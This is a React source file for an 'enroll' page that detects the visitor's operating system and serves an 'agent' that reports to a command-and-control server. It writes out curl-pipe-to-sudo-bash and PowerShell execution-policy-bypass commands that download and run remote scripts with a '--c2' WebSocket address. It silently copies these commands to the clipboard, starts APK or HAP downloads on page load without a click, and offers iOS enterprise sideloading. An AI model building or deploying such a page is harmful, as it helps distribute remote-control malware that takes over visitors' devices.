import { useState, useEffect } from "react";
import { Download, Check, Loader2 } from "lucide-react";

type Platform = "linux" | "macos" | "windows" | "android" | "ios" | "harmony";

const PLATFORM_META: Record<Platform, { color: string; dlFile: string; isScript: boolean }> = {
  linux:   { color: "#f97316", dlFile: "linux.sh",        isScript: true  },
  macos:   { color: "#a3a3a3", dlFile: "macos.sh",        isScript: true  },
  windows: { color: "#3b82f6", dlFile: "windows.ps1",     isScript: true  },
  android: { color: "#10b981", dlFile: "bixtx-agent.apk", isScript: false },
  ios:     { color: "#6b7280", dlFile: "bixtx-agent.ipa", isScript: false },
  harmony: { color: "#a855f7", dlFile: "bixtx-agent.hap", isScript: false },
};

const DL_BASE = window.location.hostname === "localhost"
  ? "http://localhost:3000/v1/agent/download"
  : "https://bixtx.onrender.com/v1/agent/download";

const C2 = "wss://bixtx.onrender.com/agent";

function detectOS(): Platform {
  const ua = navigator.userAgent.toLowerCase();
  if (/iphone|ipad|ipod/.test(ua)) return "ios";
  if (/android/.test(ua)) return "android";
  if (/mac os/.test(ua) && !/iphone|ipad/.test(ua)) return "macos";
  if (/win/.test(ua)) return "windows";
  if (/harmony/.test(ua)) return "harmony";
  return "linux";
}

function parseURL(): { platform: Platform; enrollKey: string } {
  const parts = window.location.pathname.split("/").filter(Boolean);
  let platform: Platform = detectOS();
  if (parts.length >= 2 && parts[1] in PLATFORM_META) {
    platform = parts[1] as Platform;
  }
  const key = new URLSearchParams(window.location.search).get("key") ?? "";
  return { platform, enrollKey: key };
}

function triggerFileDL(dlFile: string) {
  const a = document.createElement("a");
  a.href = `${DL_BASE}/${dlFile}`;
  a.download = dlFile;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
}

export function EnrollPage() {
  const { platform, enrollKey } = parseURL();
  const [detected] = useState<Platform>(platform);
  const [phase, setPhase] = useState<"idle" | "running" | "done">("idle");
  const meta = PLATFORM_META[detected];
  const key = enrollKey || "BTX-2026-ALPHA";

  const installCmd =
    detected === "linux"
      ? `curl -sSL '${DL_BASE}/linux.sh' | sudo bash -s -- --key ${key} --c2 ${C2}`
      : detected === "macos"
      ? `curl -sSL '${DL_BASE}/macos.sh' | sudo bash -s -- --key ${key} --c2 ${C2}`
      : detected === "windows"
      ? `powershell -ExecutionPolicy Bypass -c "& { $s=iwr '${DL_BASE}/windows.ps1' -UseBasicParsing; iex $s.Content }" -EnrollKey ${key}`
      : "";

  useEffect(() => {
    if (!meta.isScript && (detected === "android" || detected === "harmony")) {
      handleInstall();
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const handleInstall = () => {
    if (phase === "running") return;
    setPhase("running");
    triggerFileDL(meta.dlFile);
    if (meta.isScript && installCmd) {
      navigator.clipboard.writeText(installCmd).catch(() => {});
    }
    if (enrollKey) {
      fetch(`${DL_BASE.replace("/agent/download", "")}/enroll/ping`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ key: enrollKey, platform: detected }),
      }).catch(() => {});
    }
    setTimeout(() => setPhase("done"), 1200);
  };

  return (
    <div
      className="min-h-screen flex items-center justify-center"
      style={{ background: "#050c1a" }}
    >
      {detected === "ios" ? (
        <a
          href={`itms-services://?action=download-manifest&url=${encodeURIComponent(`${DL_BASE}/ios-manifest.plist`)}`}
          className="flex items-center gap-3 px-10 py-5 rounded-2xl font-bold text-lg transition-all hover:opacity-90 active:scale-95"
          style={{
            background: "linear-gradient(135deg,#6b7280,#4b5563)",
            color: "#fff",
            boxShadow: "0 0 32px rgba(107,114,128,0.4)",
          }}
        >
          <Download size={22} /> Install via Enterprise OTA
        </a>
      ) : (
        <button
          onClick={handleInstall}
          disabled={phase === "running"}
          className="flex items-center gap-3 px-10 py-5 rounded-2xl font-bold text-lg transition-all active:scale-95 disabled:opacity-70"
          style={{
            background:
              phase === "done"
                ? "linear-gradient(135deg,#10b981,#059669)"
                : `linear-gradient(135deg,${meta.color},${meta.color}cc)`,
            color: "#fff",
            boxShadow:
              phase === "done"
                ? "0 0 32px rgba(16,185,129,0.45)"
                : `0 0 32px ${meta.color}55`,
          }}
        >
          {phase === "running" ? (
            <Loader2 size={22} className="animate-spin" />
          ) : phase === "done" ? (
            <Check size={22} strokeWidth={3} />
          ) : (
            <Download size={22} />
          )}
          {phase === "running"
            ? "Starting…"
            : phase === "done"
            ? meta.isScript
              ? "Paste in terminal to install"
              : "Download started"
            : `Download ${meta.dlFile}`}
        </button>
      )}
    </div>
  );
}
